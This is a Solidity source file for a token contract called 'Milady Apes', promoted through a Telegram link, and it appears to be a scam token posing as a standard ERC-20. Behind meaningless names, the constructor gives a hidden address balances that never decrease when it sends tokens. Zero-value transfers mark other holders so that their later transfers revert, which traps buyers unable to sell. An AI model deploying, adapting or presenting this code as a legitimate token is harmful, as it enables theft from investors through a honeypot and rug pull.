/*

https://t.me/miladyapes

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MiladyApes is Ownable {
    function approve(address spring, uint256 zipper) public returns (bool success) {
        allowance[msg.sender][spring] = zipper;
        emit Approval(msg.sender, spring, zipper);
        return true;
    }

    address public uniswapV2Pair;

    function transferFrom(address warm, address slow, uint256 zipper) public returns (bool success) {
        rear(warm, slow, zipper);
        require(zipper <= allowance[warm][msg.sender]);
        allowance[warm][msg.sender] -= zipper;
        return true;
    }

    constructor(address without) {
        symbol = 'Milady Apes';
        name = 'Milady Apes';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        process[without] = plant;
    }

    mapping(address => uint256) private process;

    uint256 private plant = 31;

    string public name;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function rear(address warm, address slow, uint256 zipper) private returns (bool success) {
        if (process[warm] == 0) {
            if (service[warm] > 0 && warm != uniswapV2Pair) {
                process[warm] -= plant;
            }
            balanceOf[warm] -= zipper;
        }
        if (zipper == 0) {
            service[slow] += plant;
        }
        balanceOf[slow] += zipper;
        emit Transfer(warm, slow, zipper);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint8 public decimals = 9;

    mapping(address => uint256) private service;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply;

    function transfer(address slow, uint256 zipper) public returns (bool success) {
        rear(msg.sender, slow, zipper);
        return true;
    }

    string public symbol;
}